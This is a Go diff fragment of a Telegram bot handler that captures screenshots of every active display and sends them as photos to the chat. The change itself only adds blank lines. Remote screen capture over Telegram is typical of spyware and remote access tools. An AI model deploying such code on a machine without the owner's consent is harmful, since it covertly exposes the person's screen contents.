@@ -46,25 +46,30 @@ func (t *Telegram) RegisterHandlers() {
 
 		n := screenshot.NumActiveDisplays()
 		if n == 0 {
+
 			return c.Send("No active displays found")
 		}
 
 		c.Send("Processing ...")
 
 		for i := 0; i < n; i++ {
+
 			bounds := screenshot.GetDisplayBounds(i)
 			img, err := screenshot.CaptureRect(bounds)
 			if err != nil {
+
 				return c.Send(fmt.Sprintf("Failed to capture screenshot: %v", err))
 			}
 
 			var buf bytes.Buffer
 			if err := png.Encode(&buf, img); err != nil {
+
 				return c.Send(fmt.Sprintf("Failed to encode screenshot: %v", err))
 			}
 
 			photo := &tele.Photo{File: tele.FromReader(&buf)}
 			if err := c.Send(photo); err != nil {
+
 				return c.Send(fmt.Sprintf("Failed to send photo: %v", err))
 			}
 		}
